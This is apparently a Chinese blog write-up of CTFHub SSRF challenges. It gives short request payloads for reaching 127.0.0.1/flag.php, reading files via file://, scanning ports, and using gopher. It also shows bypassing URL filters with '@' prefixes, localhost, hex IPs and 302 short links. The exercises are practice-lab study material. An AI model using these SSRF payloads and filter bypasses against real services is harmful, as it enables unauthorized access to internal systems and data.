---
# 这是页面的图标
icon: token
# 这是文章的标题
title: CTFHub-SSRF-writeup
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-24
# 一个页面只能有一个分类
category: 安全工具
# 一个页面可以有多个标签
tag:
  - CTF
  - 信息收集

comment: false
---

## 内网访问
  直接构造访问请求,获取flag
  ```url
  /?url=127.0.0.1/flag.php
  ```
## 伪协议读取文件
  根据题目提示使用file://协议，尝试一般web目录/var/www/html/  
  ![file](/assets/img/ctf/file.png)
## 端口扫描
  提示端口范围8000到9000
  ```url
  /?url=127.0.0.1:8000
  ```
  使用burpsuite对端口进行爆破，即可得到端口，访问获取flag
## POST请求
  gopher协议是SSRF中常用的一个协议：
  ```url
  gopher://IP:port/_{TCP/IP数据流}
  ```
  使用gopher访问flag.php

## URL Bypasss
  访问地址提示"start with `http://notfound.ctfhub.com`", 所以需要以`http://notfound.ctfhub.com`开头，构造访问url如下获取flag
  ```url
  /?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
  ```
## 数字IP Bypass
题目提示ban掉了127以及172.不能使用点分十进制的IP，但是又要访问127.0.0.1
  - 方法一：  
  使用localhost代替127.0.0.1,构造请求url如下，获取flag
  ```url
  /?url=http://localhost/flag.php
  ```
  - 方法二:  
  将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag
  ```url
  /?url=http://0x7F000001/flag.php
  ```  

## 302跳转 Bypass
题目提示过滤了127.0.0.1，使用[数字IP Bypass](#数字ip-bypass)可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag，[短链接生成网站](https://my5353.com/)  
![短链接访问](/assets/img/ctf/302.png)
